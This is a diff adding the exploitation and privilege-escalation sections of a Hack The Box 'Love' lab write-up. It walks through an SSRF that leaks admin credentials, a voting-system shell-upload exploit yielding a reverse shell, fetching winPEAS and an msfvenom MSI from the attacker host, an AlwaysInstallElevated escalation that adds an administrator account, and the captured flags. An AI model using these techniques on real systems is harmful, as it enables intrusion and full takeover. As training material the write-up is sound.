@@ -306,11 +306,453 @@ And we get new web-page *http://staging.love.htb/*
 
 # Explotation
 
+Ok, we seethe web-page "Free File Scanner". Clicking one tab *Demo*.
 
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l5.PNG)
+
+We can write any url to upload file. Let's upload php-reverse shell
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l6.PNG)
+
+Ok, it's doesn't work. But we can create requests to any servers... There is [SSRF](https://portswigger.net/web-security/ssrf), which allow make requests from server to local services.
+
+Let's try to make request to local services *http://localhost:5000/*, because we got 403 code before.
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l7.PNG)
+
+Wow! We get web-page with Voting system Administration's credential
+
+```
+admin:@LoveIsInTheAir!!!!
+```
+
+Let's go to Admin page of love.htb to check it and login. And we have success
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l8.PNG)
+
+In Google we find exploits  for *voting system php*.
+
+* https://www.exploit-db.com/exploits/49445
+* https://packetstormsecurity.com/files/162497/Voting-System-1.0-Shell-Upload.html
+
+Download first python exploit to kali and edit it...
+
+![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/l9.PNG)
+
+Run it..
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Love]
+└─# python3 exploit_vote.py                      
+Start a NC listner on the port you choose above and run...
+Logged in
+Poc sent successfully
+```
+
+And we get reverse shell
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Love]
+└─# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.29] from love.htb [10.10.10.239] 50749
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images>whoami
+whoami
+love\phoebe
+```
+
+Getting **user.txt**
+
+```
+C:\xampp\htdocs\omrs\images>cd C:\
+cd C:\
+
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users
+
+04/13/2021  06:58 AM    <DIR>          .
+04/13/2021  06:58 AM    <DIR>          ..
+04/12/2021  03:00 PM    <DIR>          Administrator
+04/21/2021  07:01 AM    <DIR>          Phoebe
+04/12/2021  02:10 PM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)   4,015,972,352 bytes free
+
+C:\Users>cd Phoebe
+cd Phoebe
+
+C:\Users\Phoebe>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users\Phoebe
+
+04/21/2021  07:01 AM    <DIR>          .
+04/21/2021  07:01 AM    <DIR>          ..
+04/12/2021  03:50 PM    <DIR>          3D Objects
+04/12/2021  03:50 PM    <DIR>          Contacts
+04/13/2021  03:20 AM    <DIR>          Desktop
+04/12/2021  03:50 PM    <DIR>          Documents
+04/13/2021  09:55 AM    <DIR>          Downloads
+04/12/2021  03:50 PM    <DIR>          Favorites
+04/12/2021  03:50 PM    <DIR>          Links
+04/12/2021  03:50 PM    <DIR>          Music
+04/12/2021  03:52 PM    <DIR>          OneDrive
+04/21/2021  07:01 AM    <DIR>          Pictures
+04/12/2021  03:50 PM    <DIR>          Saved Games
+04/12/2021  03:51 PM    <DIR>          Searches
+04/23/2021  03:39 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              15 Dir(s)   4,015,972,352 bytes free
+
+C:\Users\Phoebe>cd Desktop
+cd Desktop
+
+C:\Users\Phoebe\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users\Phoebe\Desktop
+
+04/13/2021  03:20 AM    <DIR>          .
+04/13/2021  03:20 AM    <DIR>          ..
+05/29/2021  05:33 PM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   4,015,951,872 bytes free
+
+C:\Users\Phoebe\Desktop>type user.txt
+type user.txt
+5f9b350b2de0357e07db88999d65027b
+```
 
 # Privilege Escalation
 
+Let's download [winPEAS.exe] (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
+to kali and upload to love.htb machine.
 
+```
+┌──(root💀kali)-[/home/kali/HTB/Love]
+└─# wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
+--2021-05-30 04:28:46--  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
+Resolving github.com (github.com)... 140.82.121.3
+Connecting to github.com (github.com)|140.82.121.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe [following]
+--2021-05-30 04:28:47--  https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1678848 (1.6M) [application/octet-stream]
+Saving to: ‘winPEASany.exe’
+
+winPEASany.exe                             100%[=======================================================================================>]   1.60M  2.44MB/s    in 0.7s    
+
+2021-05-30 04:28:48 (2.44 MB/s) - ‘winPEASany.exe’ saved [1678848/1678848]
+```
+
+Upload it to love.htb
+
+```
+C:\Users\Phoebe\Desktop>curl
+curl
+curl: try 'curl --help' for more information
+
+C:\Users\Phoebe\Desktop>curl -O http://10.10.14.29:8000/winPEASany.exe
+curl -O http://10.10.14.29:8000/winPEASany.exe
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 1639k  100 1639k    0     0   819k      0  0:00:02  0:00:02 --:--:--  794k
+
+C:\Users\Phoebe\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users\Phoebe\Desktop
+
+05/30/2021  02:03 AM    <DIR>          .
+05/30/2021  02:03 AM    <DIR>          ..
+05/29/2021  05:33 PM                34 user.txt
+05/30/2021  02:03 AM         1,678,848 winPEASany.exe
+               2 File(s)      1,678,882 bytes
+               2 Dir(s)   4,013,727,744 bytes free
+```
+
+And run winPEAS
+
+```
+C:\Users\Phoebe\Desktop>winPEASany.exe >> winpeas.txt
+winPEASany.exe >> winpeas.txt
+
+C:\Users\Phoebe\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users\Phoebe\Desktop
+
+05/30/2021  02:05 AM    <DIR>          .
+05/30/2021  02:05 AM    <DIR>          ..
+05/29/2021  05:33 PM                34 user.txt
+05/30/2021  02:05 AM           145,679 winpeas.txt
+05/30/2021  02:03 AM         1,678,848 winPEASany.exe
+               3 File(s)      1,824,561 bytes
+               2 Dir(s)   4,013,088,768 bytes free
+```
+
+Copy winPEAS.txt to images and download to kali to read report
+
+```
+C:\Users\Phoebe\Desktop>copy winpeas.txt C:\xampp\htdocs\omrs\images
+copy winpeas.txt C:\xampp\htdocs\omrs\images
+        1 file(s) copied.
+
+C:\Users\Phoebe\Desktop>cd C:\xampp\htdocs\omrs\images
+cd C:\xampp\htdocs\omrs\images
+
+C:\xampp\htdocs\omrs\images>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\xampp\htdocs\omrs\images
+
+05/30/2021  02:08 AM    <DIR>          .
+05/30/2021  02:08 AM    <DIR>          ..
+05/30/2021  02:06 AM             5,632 D3fa1t_shell.exe
+05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
+04/12/2021  03:53 PM                 0 index.html.txt
+01/27/2021  12:08 AM               844 index.jpeg
+08/24/2017  04:00 AM            26,644 profile.jpg
+05/30/2021  02:06 AM             6,491 shell.php
+05/30/2021  02:05 AM           145,679 winpeas.txt
+               7 File(s)        189,530 bytes
+               2 Dir(s)   4,013,129,728 bytes free
+```
+
+Download it from http://love/htb/images/
+
+```
+┌──(root💀kali)-[/home/kali/HTB/Love]
+└─# wget http://love.htb/images/winpeas.txt                                                                                                     
+--2021-05-30 04:37:02--  http://love.htb/images/winpeas.txt
+Resolving love.htb (love.htb)... 10.10.10.239
+Connecting to love.htb (love.htb)|10.10.10.239|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 145679 (142K) [text/plain]
+Saving to: ‘winpeas.txt’
+
+winpeas.txt                                100%[=======================================================================================>] 142.26K   421KB/s    in 0.3s    
+
+2021-05-30 04:37:03 (421 KB/s) - ‘winpeas.txt’ saved [145679/145679]
+
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Love]
+└─# ls
+exploit_vote.py  pasha.php  winPEASany.exe  winpeas.txt
+```
+
+In the report we find interesting info
+
+```
+  [+] Checking AlwaysInstallElevated
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+```
+
+It means, that if these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\SYSTEM.
+
+* https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+* https://github.com/RackunSec/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/always-install-elevated.md
+* https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path
+* 
+
+We can create payload with msfvenom
+
+```
+msf6 > msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
+[*] exec: msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 284 bytes
+Final size of msi file: 159744 bytes
+Saved as: alwe.msi
+msf6 > exit
+                                                                                                                                                                           
+┌──(root💀kali)-[/home/kali/HTB/Love]
+└─# ls
+alwe.msi  exploit_vote.py  pasha.php  winPEASany.exe  winpeas.txt
+```
+
+Upload payload to love.htb
+
+```
+C:\Users\Phoebe\Music>curl -O http://10.10.14.29:8000/alwe.msi
+curl -O http://10.10.14.29:8000/alwe.msi
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  269k
+
+C:\Users\Phoebe\Music>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users\Phoebe\Music
+
+05/30/2021  02:19 AM    <DIR>          .
+05/30/2021  02:19 AM    <DIR>          ..
+05/30/2021  02:19 AM           159,744 alwe.msi
+               1 File(s)        159,744 bytes
+               2 Dir(s)   4,012,601,344 bytes free
+```
+
+And Run it
+
+```
+C:\Users\Phoebe\Music>net user
+net user
+
+User accounts for \\LOVE
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+Phoebe                   WDAGUtilityAccount       
+The command completed successfully.
+
+:\Users\Phoebe\Music>msiexec /quiet /qn /i alwe.msi            
+msiexec /quiet /qn /i alwe.msi
+
+C:\Users\Phoebe\Music>net user
+net user
+
+User accounts for \\LOVE
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+Phoebe                   rottenadmin              WDAGUtilityAccount       
+The command completed successfully.
+```
+
+And we create net user *rottenadmin* with system's privilages
+
+```
+C:\Users\Phoebe\Music>net user rottenadmin
+net user rottenadmin
+User name                    rottenadmin
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/30/2021 2:31:16 AM
+Password expires             7/11/2021 2:31:16 AM
+Password changeable          5/30/2021 2:31:16 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+
+Let's use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to connect host
+
+```
+──(root💀kali)-[/home/kali/HTB/Love]
+└─# evil-winrm -i love.htb -u rottenadmin -p 'P@ssword123!'
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\rottenadmin\Documents> whoami
+love\rottenadmin
+```
+
+And we get **root.txt**
+
+```
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/12/2021   3:00 PM                Administrator
+d-----         4/21/2021   7:01 AM                Phoebe
+d-r---         4/12/2021   2:10 PM                Public
+d-----         5/30/2021   2:37 AM                rottenadmin
+
+
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         4/12/2021   2:55 PM                3D Objects
+d-r---         4/12/2021   2:55 PM                Contacts
+d-r---         4/13/2021   3:20 AM                Desktop
+d-r---         4/12/2021   2:55 PM                Documents
+d-r---         4/13/2021   3:18 AM                Downloads
+d-r---         4/12/2021   2:55 PM                Favorites
+d-r---         4/12/2021   2:55 PM                Links
+d-r---         4/12/2021   2:55 PM                Music
+d-r---         4/13/2021   3:16 AM                OneDrive
+d-r---         4/12/2021   2:57 PM                Pictures
+d-r---         4/12/2021   2:55 PM                Saved Games
+d-r---         4/12/2021   2:57 PM                Searches
+d-r---         4/12/2021   2:55 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         5/29/2021   5:33 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+c7d28291043b3a8af835c2e5b7cfdb34
+```
 
 # Resources
 
